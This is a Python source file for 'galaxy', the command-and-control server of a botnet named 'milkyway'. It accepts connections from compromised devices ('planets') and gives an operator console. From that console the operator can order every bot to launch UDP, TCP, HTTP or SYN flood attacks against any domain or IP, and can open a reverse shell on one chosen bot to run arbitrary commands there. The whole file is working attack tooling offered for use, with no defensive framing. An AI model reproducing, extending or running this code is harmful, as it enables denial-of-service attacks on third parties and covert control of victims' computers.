#!/usr/bin/env python3

"""galaxy: The milkyway server software."""

# import libraries
import os
from secrets import token_hex
import socket
import sys
import time
from re import sub
from threading import Thread
from signal import signal, SIGINT


# functions
class Utilities:
    """Provide some useful variables and utilities."""

    online = False
    platform = ""
    port = 9999

    def __init__(self):
        """Perform some important tasks on initialization.

        Tasks:
        - Check to see if the OS that the galaxy is running is macOS, Linux, or Windows.
        - Start a SIGINT exit handler to safely close the galaxy.
        - Open a socket, and bind to a specified port.
        """
        self.check_platform()
        signal(SIGINT, self.exit_handler)
        while not self.online:
            try:
                print(f"Attempting to bind to galaxy port {self.port}...")
                self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.socket.bind(("0.0.0.0", self.port))
                self.socket.listen()
                self.socket.settimeout(0.5)
                self.online = True
                print(f"Succeeded in binding to galaxy port {self.port}!")
            except OSError as e:
                if str(e) == "[Errno 98] Address already in use":
                    print(f"Galaxy port {self.port} is already in use. Retrying in 5 seconds...")
                    time.sleep(5)
                else:
                    raise e

    def check_platform(self):
        """Ensure the platform that the galaxy is running on is either Linux, macOS, or Windows."""
        if sys.platform in ("linux", "linux2"):
            self.platform = "linux"
        elif sys.platform == "darwin":
            self.platform = "mac"
        elif sys.platform == "win32":
            self.platform = "windows"
        else:
            sys.exit("Unsupported platform.")

    def exit_handler(self, *args):
        """Ensure a safe and smooth exit."""
        self.online = False
        self.socket.close()
        if "cmd" in args:
            print("| Exiting...")
        else:
            print("\nExiting...")
        os._exit(0)

    def clear(self):
        """Clear the screen."""
        if self.platform in ("linux", "mac"):
            os.system("/usr/bin/clear")
        elif self.platform == "windows":
            os.system("cls")


class PlanetHandler:
    """Handle remote devices."""

    planets: list[socket.socket]
    planets = []
    planet_ids: list[str]
    planet_ids = []
    planet_ips: list[tuple]
    planet_ips = []

    def remove_planet(self, planet):
        """Remove a planet from all planet lists."""
        planet_index = self.planets.index(planet)
        self.planets.remove(planet)
        del self.planet_ips[planet_index]
        del self.planet_ids[planet_index]
        if planet in ddos_handler.planets:
            ddos_handler.planets.remove(planet)
        if shell_handler.planet == planet:
            shell_handler.planet = ""

    def planet_thread(self, planet):
        """Handle incoming messages from a planet."""
        while utilities.online:
            try:
                data = planet.recv(1024).decode("ascii").lower().strip()
                if not data:
                    break
                elif data == "offline":
                    self.remove_planet(planet)
            except BrokenPipeError:
                self.remove_planet(planet)

    def connection_handler(self):
        """Handle connections from planets."""
        while utilities.online:
            try:
                planet, addr = utilities.socket.accept()
                self.planets.append(planet)
                self.planet_ips.append(addr)
                planet_id = token_hex(10)
                self.planet_ids.append(planet_id)
                planet.send(f"planet ID: {planet_id}".encode())
                Thread(target=self.planet_thread, args=(planet, )).start()
            except TimeoutError:
                pass
            except OSError as e:
                if str(e) == "[Errno 9] Bad file descriptor":
                    break
                else:
                    raise e


class DDoSHandler:
    """Handle outgoing DDoS commands."""

    planets: list[socket.socket]
    planets = []
    ip = ""
    port = 0
    type = ""

    def start_attack(self):
        """Send attack command to all remote devices."""
        for planet in planet_handler.planets:
            try:
                planet.send(f"ddos {self.ip} {self.port} {self.type}".encode())
                self.planets.append(planet)
            except BrokenPipeError:
                planet_handler.remove_planet(planet)
        print("| Attack successfully started.")

    def stop_attack(self):
        """Send stop attack command to all remote devices."""
        planets_old = self.planets
        for planet in planets_old:
            try:
                planet.send("ddos stop".encode())
                self.planets.remove(planet)
            except BrokenPipeError:
                planet_handler.remove_planet(planet)
        print("| Attack successfully stopped.")

    def check_target(self):
        """Check to see if target is online, and all target values entered are valid."""
        try:
            self.port = int(self.port)
        except ValueError:
            print("| ERROR: Invalid port. Please enter a valid number.")
            return False
        try:
            trimmed_ip = sub(r"htt.*.\/", "", self.ip).replace("www.", "")
            self.ip = socket.gethostbyname(trimmed_ip)
        except socket.gaierror:
            print("| ERROR: Invalid address. Please enter a valid domain or IPv4 address.")
            return False
        if self.type == "udp":
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        elif self.type in ("tcp", "http"):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
            s = socket.socket()
        try:
            s.connect((self.ip, self.port))
            s.close()
        except ConnectionRefusedError:
            print("| ERROR: Invalid port. Please enter an open port.")
            return False
        return True

    def ddos(self, cmd_ddos):
        """Initiate a DDoS attack using remote devices."""
        if not planet_handler.planets:
            print("| ERROR: There are no planets connected to attack with.")
            return
        if cmd_ddos != "ddos stop":
            split_cmd = cmd_ddos.strip().split()
            if len(split_cmd) < 4:
                print("| ERROR: One or more arguments not specified.")
                return
            elif len(split_cmd) > 4:
                print("| ERROR: Too many arguments specified.")
                return
            else:
                _, self.ip, self.port, self.type = split_cmd
        else:
            self.stop_attack()
            return
        if self.type not in ("udp", "tcp", "http", "syn"):
            print("| ERROR: Invalid attack type. Please enter a valid attack type.")
            return
        result = self.check_target()
        if result:
            self.start_attack()


class ShellHandler:
    """Handle shell command."""

    online = False
    port = 10000
    planet = ""
    cwd = ""

    def __init__(self):
        """Bind socket and establish connection with planet."""
        while not self.online:
            try:
                print(f"Attempting to bind to shell port {self.port}...")
                self.socket = socket.socket()
                self.socket.bind(("0.0.0.0", self.port))
                self.socket.listen()
                self.socket.settimeout(0.5)
                self.online = True
                print(f"Succeeded in binding to shell port {self.port}!")
                input("(Press ENTER to continue.)")
            except OSError as e:
                if str(e) == "[Errno 98] Address already in use":
                    print(f"Shell port {self.port} is already in use. Retrying in 5 seconds...")
                    time.sleep(5)
                else:
                    raise e

    def init_connection(self):
        """Accept planet connection and recieve CWD from planet."""
        while True:
            try:
                self.planet, _ = self.socket.accept()
                self.cwd = self.planet.recv(128 * 1024).decode()
                break
            except OSError as e:
                if "Bad file descriptor" in str(e):
                    self.socket.close()
                    return
                else:
                    raise e

    def shell(self, cmd_shell):
        """Establish a reverse shell with a remote device."""
        new_cmd = cmd_shell.replace("shell ", "").strip().split()
        if len(new_cmd) > 1:
            print("| ERROR: Too many arguments specified.")
        elif len(new_cmd) == 0:
            print("| ERROR: No arguments specified.")
        else:
            planet_id = new_cmd[0]
        if planet_id not in planet_handler.planet_ids:
            print("| ERROR: The specified planet ID does not exist.")
            return
        shelled_planet = planet_handler.planets[planet_handler.planet_ids.index(planet_id)]
        shelled_planet.send("shell start".encode())
        self.init_connection()
        utilities.clear()
        print(milkyway_logo)
        print("Type 'exit' to leave shell.")
        print("NOTE: Commands that require input will not work!\n")
        while shelled_planet in planet_handler.planets:
            shell_cmd = input(f"{planet_id} | {self.cwd} > ")
            shell_cmd = f"{shell_cmd}"
            self.planet.send(shell_cmd.encode())
            if not shell_cmd:
                continue
            elif shell_cmd.lower() == "exit":
                utilities.clear()
                print(milkyway_logo)
                print("Type 'help' for a list of commands.\n")
                break
            output = self.planet.recv(128 * 1024).decode()
            result, self.cwd = output.split("<sep>")
            print(result)
        if shelled_planet not in planet_handler.planets:
            utilities.clear()
            print(milkyway_logo)
            print("ERROR: Shelled planet is now offline.")
            print("Type 'help' for a list of commands.\n")
            return
        self.planet = ""


def command_help():
    """List all available commands."""
    print("| ddos <address> <port> <type>")
    print("| |-> Launches a DDoS attack using all connected planets.")
    print("| |-> Address must either be a domain, or an IPv4 address.")
    print("| |-> Types: tcp, http, udp, syn")
    print("| |-> 'ddos stop' will stop an in progress attack.")
    print("| shell <planet-id>")
    print("| |-> Opens a reverse shell on a the specified planet.")
    print("| |-> Commands that require input from the user will not work!")
    print("| list")
    print("| |-> Lists all connected planets.")
    print("| exit")
    print("| |-> Exits milkyway.")


def command_list():
    """List all connected planets."""
    if len(planet_handler.planets) > 0:
        print("| Connected planets:")
        for i, planet_ip in enumerate(planet_handler.planet_ips):
            planet_attacking = "false"
            planet_shelled = "false"
            planet_ip_list = list(planet_ip)
            planet_ip_port = f"{planet_ip_list[0]}:{planet_ip_list[1]}"
            list_planet = planet_handler.planets[i]
            if list_planet in ddos_handler.planets:
                planet_attacking = "true"
            if list_planet == shell_handler.planet:
                planet_shelled = "true"
            print(f"| {i + 1}. IP/Port: {planet_ip_port} | ID: {planet_handler.planet_ids[i]}")
            print(f"| |-> Attacking: {planet_attacking} | Shelled: {planet_shelled}")
    else:
        print("| There are no planets connected.")


# logo
milkyway_logo = """
||||||||||| ||||||||| |||       |||   ||| |||   ||| ||| ||| ||| ||||||||| |||   |||
||| ||| |||    |||    |||       ||||||    ||||||||| ||| ||| ||| |||   ||| |||||||||
||| ||| |||    |||    |||       |||   |||    |||    ||| ||| ||| |||||||||    |||
||| ||| ||| ||||||||| ||||||||| |||   |||    |||    ||||||||||| |||   |||    |||
"""

# initialize classes
planet_handler = PlanetHandler()
ddos_handler = DDoSHandler()
utilities = Utilities()
Thread(target=planet_handler.connection_handler).start()
shell_handler = ShellHandler()

# main stuff
utilities.clear()
print(milkyway_logo)
print("Type 'help' for a list of commands.\n")
while True:
    cmd = input("> ")
    if cmd == "help":
        command_help()
    elif cmd == "list":
        command_list()
    elif cmd == "exit":
        utilities.exit_handler("", "", "cmd")
    elif cmd[:5] == "ddos ":
        ddos_handler.ddos(cmd)
    elif cmd[:6] == "shell ":
        shell_handler.shell(cmd)
    else:
        print("| Invalid command.")
